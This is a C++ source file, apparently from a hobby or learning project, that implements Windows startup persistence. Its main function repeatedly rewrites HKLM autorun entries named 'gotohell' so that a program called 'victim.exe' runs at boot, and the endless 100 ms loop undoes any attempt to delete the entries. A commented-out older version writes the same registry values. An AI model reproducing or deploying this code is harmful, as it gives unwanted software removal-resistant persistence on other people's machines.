#include"main.h"


void SetAutoRun() 
{

	CRegKey regkey;
	int errcode = 0;
	errcode = regkey.Open(HKEY_LOCAL_MACHINE, ADMIN_AUTORUN);
	if (errcode == ERROR_SUCCESS) {
		while (1)
		{
			regkey.SetStringValue(L"gotohell32", L"\"c:\\program files (x86)\\victim.exe\"");
			regkey.SetStringValue(L"gotohell", L"\"c:\\program files\\victim.exe\"");
			//
			Sleep(100);
		}
	}
	cout << GetLastError() << endl;
	
	/*TCHAR value[100] = { 0, };
	ULONG size = 200;
	errcode = regkey.Open(HKEY_LOCAL_MACHINE, ADMIN_AUTORUN);
	regkey.QueryMultiStringValue(L"gotohell32",value,&size);
	MessageBox(NULL, L"hello", L"ok", MB_OK);*/
	//regkey.QueryStringValue(L"Run",value,&size);
	//wcout << GetLastError()<<value << endl;
	regkey.Close();
	return;
	
}
//https://xenostudy.tistory.com/361
//https://bstyle.tistory.com/34
//https://nowprogramming.tistory.com/53
//http://tsc78.blogspot.com/2009/10/cregkey-%EC%82%AC%EC%9A%A9-%EC%98%88%EC%A0%9C.html    <---중요




/*LONG errcode = 0;
	DWORD dwtype;
	HKEY hkey = { 0, };
	DWORD dwname_size = 256;
	char name[256] = { 0, };
	DWORD dwdesc;
	CRegKey regkey;
	errcode = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);


	errcode = RegCreateKeyEx(
		HKEY_LOCAL_MACHINE,					//생성할 키의 루트키
		ADMIN_AUTORUN,						//생성할 서브키
		0,									//예약된 인자 (0주자)
		NULL,								//키의 지정된 클래스명(보통 NULL)
		REG_OPTION_NON_VOLATILE,			//정보를 파일에 기록하는 플래그
		KEY_ALL_ACCESS,						//모든 권한 참고
		NULL,								//자식 프로세스상속관련(보통NULL)
		&hkey,								//생성될 키 핸들 포인터 RegCloseKey로 키해제하자
		&dwdesc								//생성된 키의 상태를 알려줌(보통 NULL)
	);										//반환값 : REG_CREATED_NEW_KEY : 새로 생성된 키
											//		 : REG_OPENED_EXISTING_KEY : 기존에 존재하던 키





	if (errcode != ERROR_SUCCESS)
	{

		SystemError(L"RegCreateKeyError");
		return;
	}
	errcode = RegQueryValueEx(hkey, L"gotohell", NULL, &dwtype, (LPBYTE)name, &dwname_size);
	if (errcode == ERROR_SUCCESS)
	{
		cout << "ok" << endl;
		return;
	}
	else
	{
		cout << "Reg Find failed " << endl;
		cout << "Create Autorun...." << endl;

	}

	TCHAR path_system32[] = CURRENT_FILE_PATH_SYSTEM32;
	TCHAR path_system[] = CURRENT_FILE_PATH_SYSTEM;

	errcode = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
		ADMIN_AUTORUN,
		NULL,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hkey,
		NULL
	);
	TCHAR path_system32A[] = L"C:\\Windows\\System32\\victim.exe";
	TCHAR path_systemA[] = L"C:\\Windows\\System\\victim.exe";
	if (errcode == ERROR_SUCCESS)
	{
		//RegSetValueEx(hkey, L"gotohell", NULL, REG_SZ, (byte*)path_system32A, sizeof(path_system32A));
		//RegSetValueEx(hkey, L"gotohell", NULL, REG_SZ, (byte*)path_systemA, sizeof(path_systemA));
		regkey.Create(HKEY_LOCAL_MACHINE, ADMIN_AUTORUN);
		regkey.SetValue(L"gotohell", path_system32);
		regkey.Close();
	}

	RegCloseKey(hkey);
	*/